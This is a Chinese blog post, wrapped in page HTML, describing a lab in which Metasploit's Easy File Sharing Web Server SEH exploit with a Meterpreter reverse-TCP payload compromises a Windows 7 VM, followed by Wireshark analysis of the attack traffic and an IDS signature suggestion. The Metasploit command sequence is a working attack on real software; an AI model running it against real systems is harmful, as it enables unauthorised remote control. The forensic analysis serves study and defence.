@@ -1,0 +1,1457 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="QvPZ3tgcDy_FQ1Ivu9CLCAEPdzhAyW8GzyQ1APQgiVg" />
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="ueLXt8dSC9" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/uploads/favicon-crypto.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/favicon-crypto.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="kali,Wireshark," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ZER0-Nu1L" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前面介绍了很多种攻击方式，但是它们都是基于网络协议的缺陷。而在实际情况中，除了这些内容之外，操作系统和应用程序的漏洞也是网络安全研究的重点。 缓冲区溢出是现在很典型的一种远程攻击方式，它利用了程序员在编写程序时的疏忽，从而实现了在远程设备上执行代码。这些攻击方式大都要通过应用层的协议实现，所以本次课也会介绍应用层最为典型的协议 HTTP 。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Wireshark 系列】缓冲区溢出攻击分析">
+<meta property="og:url" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="ZER0-Nu1L">
+<meta property="og:description" content="前面介绍了很多种攻击方式，但是它们都是基于网络协议的缺陷。而在实际情况中，除了这些内容之外，操作系统和应用程序的漏洞也是网络安全研究的重点。 缓冲区溢出是现在很典型的一种远程攻击方式，它利用了程序员在编写程序时的疏忽，从而实现了在远程设备上执行代码。这些攻击方式大都要通过应用层的协议实现，所以本次课也会介绍应用层最为典型的协议 HTTP 。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/Wireshark.jpg">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image001.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image002.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image003.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image004.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203002353.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image006.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image007.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203021763.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image009.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image010.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image009.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image011.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203053290.png">
+<meta property="og:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image013.png">
+<meta property="article:published_time" content="2020-07-05T12:25:09.000Z">
+<meta property="article:modified_time" content="2020-07-05T12:32:17.525Z">
+<meta property="article:author" content="Andy Wu">
+<meta property="article:tag" content="kali">
+<meta property="article:tag" content="Wireshark">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/Wireshark.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://zer0-nu1l.github.io/2020/07/05/【Wireshark 系列】缓冲区溢出攻击分析/"/>
+
+
+
+
+
+  <title>【Wireshark 系列】缓冲区溢出攻击分析 | ZER0-Nu1L</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZER0-Nu1L</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">In me the tiger sniffs the rose.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Andy Wu">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/Profile.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZER0-Nu1L">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【Wireshark 系列】缓冲区溢出攻击分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-05T20:25:09+08:00">
+                2020-07-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index">
+                    <span itemprop="name">Web</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/Wireshark/" itemprop="url" rel="index">
+                    <span itemprop="name">Wireshark</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/Wireshark.jpg" alt="Wireshark"></p>
+<p>前面介绍了很多种攻击方式，但是它们都是基于网络协议的缺陷。而在实际情况中，除了这些内容之外，操作系统和应用程序的漏洞也是网络安全研究的重点。<br>
+缓冲区溢出是现在很典型的一种远程攻击方式，它利用了程序员在编写程序时的疏忽，从而实现了在远程设备上执行代码。这些攻击方式大都要通过应用层的协议实现，所以本次课也会介绍应用层最为典型的协议 HTTP 。</p>
+<a id="more"></a>
+<h1>缓冲区溢出攻击的相关理论</h1>
+<p>缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出进行攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，攻击者可以利用它执行非授权指令，甚至可以取得系统特权，进而执行各种操作。</p>
+<p>考虑到目前大量的应用程序都使用了 B/S 结构，而这种结构正是使用 HTTP 协议进行通信的。</p>
+<p>维基百科的定义是：<br>
+缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</p>
+<blockquote>
+<p>HTTP 协议下有一个 Host 字段，这个不是多余的，主要是虚拟化技术的发展，一台主机很可能对应多个域名。</p>
+</blockquote>
+<h1>模拟缓冲区溢出攻击</h1>
+<h2 id="实验环境">实验环境</h2>
+<blockquote>
+<p>笔者的 8GB 主机基本要把所有的进程关闭 😭</p>
+</blockquote>
+<p>kali：192.168.93.144<br>
+Win7：192.168.93.155<br>
+Wireshark 监听端口 VNet8<br>
+文件共享软件 Easy File Sharing Web Server7.2</p>
+<h2 id="实验步骤">实验步骤</h2>
+<h3 id="开启服务">开启服务</h3>
+<p>在 Win 7 下运行 文件共享软件 Easy File Sharing Web Server7.2：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image001.png" alt></p>
+<p>开启服务之后，另一台主机 kali 是可以访问的：</p>
+<p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image002.png" alt></p>
+<h3 id="缓冲区溢出攻击">缓冲区溢出攻击</h3>
+<p>在 kali 中执行 msfconsole 命令打开 Metasploit：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image003.png" style="zoom:80%;"></p>
+<p>Metasploit 是各种渗透模块的集成，先搜索一下没有没目标软件的渗透模块：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image004.png" alt></p>
+<p>我们不妨使用 2015 版的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/http/easyfilesharing_seh</span><br></pre></td></tr></table></figure>
+<p>然后进行攻击</p>
+<ol>
+<li>
+<p>选择武器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>自我定位</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.93.144</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>目标定位</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.93.155</span><br><span class="line">set rport 80</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>攻击<br>
+发送大量数据，包括木马等，实现缓冲区溢出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203002353.png" alt="image-20200705203002353"></p>
+</li>
+</ol>
+<p>这个时候已经实现了对 Win7 的控制。</p>
+<h3 id="控制">控制</h3>
+<p>接下来可以把 Win7 当做自己的主机进行控制：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image006.png" alt></p>
+<p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image007.png" alt></p>
+<h1>使用 Wireshark 分析缓冲区溢出攻击</h1>
+<h2 id="判定攻击">判定攻击</h2>
+<p>如果我们怀疑自己中了缓冲区溢出攻击，可以进行如下分析：<br>
+分析 <a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/tree/master/Package/Buffer_Overflow.pcapng" target="_blank" rel="noopener">Buffer_Overflow.pcapng</a>：</p>
+<p>先用显示过滤器过滤一下，只显示 http 相关的报文（客户端进行缓冲区溢出攻击的应用层协议）<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203021763.png" alt></p>
+<p>首先 Wireshark 已经看出来这里是一个畸形的数据包。并且，HTTP 数据包进行了分片，这往往是字段内容过大导致的，也是实现缓冲区溢出攻击的必要条件之一。</p>
+<p>我们可以用 TCP 在追踪流查看一下：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image009.png" alt></p>
+<p>可以很明显地看出 GET 后面的内容是混乱的， 没有没有实际意义可言，并且有很长很长一大段全是字符。<br>
+这很显然是为了将软件的缓冲区填满。</p>
+<h2 id="一个疑点的分析">一个疑点的分析</h2>
+<p>值得一提的是，如果你尝试在 Easy File Sharing Web Server 页面填写内容的时候，会发现自己输出长度是有限的，那怎么会导致溢出呢？<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image010.png" alt><br>
+这一点其实并不难理解，这个功能实现往往是前端页面对用户输入的限制。但是传输的时候没有限制，比如通过 Socket 编程传递这样过长的参数。<br>
+再补充一下，我们这里是用 Metasploit 中的模块实现对软件的攻击，也就意味着这个漏洞是公开知晓的。但是自己去挖漏洞的时候，就需要自己用诸如 Socket 编程的方式进行攻击。</p>
+<p>所以这里的软件是有问题的，漏洞在于不检查接收的数据有多长，只是在前端做了输入限制。<br>
+当传出的数据大于 TCP 的缓冲区，就会复制到缓冲区的外面，通俗地讲就是指向下一条要执行指令的指针（PC）指针。导致之后执行的时候，不是执行下一条程序，而是执行下一个木马。</p>
+<h2 id="缓冲区大小">缓冲区大小</h2>
+<p>程序缓冲区有多大，这个是一个非常非常关键的问题，对不同的人都有非常重要的意义。<br>
+黑客知晓之后，就可以进行攻击了，在缓冲区之外的加上木马文件，构造缓冲区溢出攻击；<br>
+安全工作者知晓之后，可以进行木马识别和网络取证等。</p>
+<p>而我们这里其实也可以看到：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image009.png" alt><br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image011.png" style="zoom:50%;"></p>
+<p>这个程序的缓冲区大小为：4061 bytes.</p>
+<h2 id="反向木马">反向木马</h2>
+<p>按照木马客户端和服务端之间建立连接的方式的不同，可以将木马分为正向连接木马和反向连接木马。</p>
+<p>正向连接木马的连接过程为：控制端首先发起通信连接的请求，然后木马被控制端响应并建立半连接，等控制端响应后，木马被控制端最终建立一个与控制端的通信连接。<br>
+正向木马其实是比较困难，黑客不知道哪些主机中了木马，而中了木马的主机等待着黑客连接它。</p>
+<p>再加上由于动态IP、防火墙过滤技术、内网访问限制等因素的存在，阻挡了许多木马的交互，使得中了木马的计算机无法与控制端联系。这样，反向连接方式就显得非常必要。</p>
+<p>进一步说，灰鸽子木马之后，常见的木马基本上都是反向木马。</p>
+<p>其连接过程是：控制端首先打开端口进行监听，被控制端主动与控制端的监听端口进行连接。木马控制端发现被控制端请求之后给出提示，然后控制者开始对被控制端主机进行控制操作。</p>
+<p>我们分析一下这里是不是反向木马。<br>
+这里的服务器 IP 是 192.168.93.155，所以先用一次显示过滤器：<br>
+ip.src == 192.168.93.155<br>
+看到有一个它主动发出的 SYN 请求：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203053290.png" alt="image-20200705203053290"></p>
+<p>去掉显示过滤器，可以看到服务器主动和另一台主机进行 TCP 三次握手：<br>
+<img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image013.png" alt></p>
+<p>所以这里攻击者使用的是反向木马。</p>
+<h2 id="应对措施">应对措施</h2>
+<p>如果你使用的软件存在这样的漏洞，但你又不得不使用这个软件，可以这样应对：<br>
+把特征写入入侵检测的特征库里，比如我们这里的特征是： HTTP GET请求, 缓冲区长度为 4061 bytes…</p>
+<h1>参考资料</h1>
+<ol>
+<li><a href="http://www.cnitpm.com/pm1/66204.html" target="_blank" rel="noopener">正向连接</a></li>
+<li><a href="http://www.cnitpm.com/pm1/66205.html" target="_blank" rel="noopener">反向连接</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA" target="_blank" rel="noopener">缓冲区溢出</a></li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+    
+    
+    
+
+    
+
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------ The end ------</div>
+    
+</div>
+      
+    </div>
+    <div>
+          
+            
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/">【Wireshark 系列】缓冲区溢出攻击分析</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Andy Wu 的个人博客">Andy Wu</a></p>
+  <p><span>发布时间:</span>2020年07月05日 - 20:07</p>
+  <p><span>最后更新:</span>2020年07月05日 - 20:07</p>
+  <p><span>原始链接:</span><a href="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" title="【Wireshark 系列】缓冲区溢出攻击分析">https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+          
+    </div>
+    
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/kali/" rel="tag"><i class="fa fa-tag"></i> kali</a>
+          
+            <a href="/tags/Wireshark/" rel="tag"><i class="fa fa-tag"></i> Wireshark</a>
+          
